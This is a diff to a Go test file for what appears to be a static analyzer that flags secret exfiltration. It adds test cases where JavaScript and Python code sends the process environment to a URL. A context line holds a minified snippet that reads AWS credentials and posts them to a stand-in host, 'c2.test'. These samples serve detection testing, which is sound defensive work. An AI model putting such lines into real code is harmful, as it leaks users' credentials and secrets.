@@ -70,6 +70,33 @@ module.exports = { loadSharedConfigFiles, httpRequest };
 `
 )
 
+// requesterProbe copies the shape of an HTTP requester that drops the proxy
+// variables of the environment for one call and restores them afterwards.
+const requesterProbe = `import os
+import requests
+
+
+class Requester:
+    def __init__(self):
+        self._http_requester = requests.Session()
+
+    def get(self, url, **kwargs):
+        return self._call_method("get", url, **kwargs)
+
+    def _call_method(self, method, url, **kwargs):
+        popped = False
+        old_env = dict(os.environ)
+        for var_name in ("http_proxy", "https_proxy", "no_proxy"):
+            popped = True if os.environ.pop(var_name, None) else popped
+            popped = True if os.environ.pop(var_name.upper(), None) else popped
+        try:
+            return getattr(self._http_requester, method)(url, **kwargs)
+        finally:
+            if popped:
+                os.environ.clear()
+                os.environ.update(old_env)
+`
+
 const (
 	// A minified async function that reads a credential file and posts it.
 	ev1o = `var a=require('path'),b=require('os'),c=require('fs');(async()=>{var d=c.readFileSync(a.join(b.homedir(),'.aws','credentials'));await fetch('https://c2.test/k',{method:'POST',body:d})})();
@@ -376,6 +403,16 @@ func TestAnalyze(t *testing.T) {
 		{name: "environment copy extended for a child", path: "a.js", data: "const e = Object.assign({}, process.env, { A: 1 });\nrun(cmd, { env: e });\nfetch(url, { body: other });\n"},
 		{name: "environment copy with a request 80 lines later", path: "a.py", data: "env = os.environ.copy()\n" + strings.Repeat("work()\n", 80) + "urllib.request.urlopen(url)\n"},
 		{name: "environment copy far from a request that uses it", path: "a.js", data: "const e = { ...process.env };\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: JSON.stringify(e) });\n"},
+		{name: "environment copy as the body of a request", path: "a.js", data: "const res = await fetch(url, { method: 'POST', body: JSON.stringify(process.env) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment copy as an argument of a request that is assigned", path: "a.js", data: "const res = await axios.post(url, JSON.stringify(process.env));\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy as the data of a request that is assigned", path: "a.py", data: "r = requests.post(url, data=dict(os.environ))\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy sent by a later statement", path: "a.py", data: "d = dict(os.environ)\nreq = urllib.request.Request(url)\nurllib.request.urlopen(req, json.dumps(d).encode())\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment copy to restore after a request", path: "requester.py", data: requesterProbe},
+		{name: "python environment copy restored right after a request", path: "a.py", data: "old_env = dict(os.environ)\nr = requests.get(url)\nos.environ.clear()\nos.environ.update(old_env)\n"},
+		{name: "python environment copy as the environment of a child and a request", path: "a.py", data: "env = dict(os.environ)\nsubprocess.run(cmd, env=env)\nrequests.get(url)\n", want: []string{"EXEC-002:2"}},
+		{name: "python environment copy for a child, passed inline, and a request", path: "a.py", data: "subprocess.run(cmd, env=dict(os.environ))\nrequests.get(url)\n", want: []string{"EXEC-002:1"}},
+		{name: "python proxy setting read from an environment copy", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, proxies={'http': env.get('http_proxy')})\n"},
+		{name: "environment copy given as the proxies of a request", path: "a.py", data: "env = dict(os.environ)\nr = requests.get(url, proxies=env)\n"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
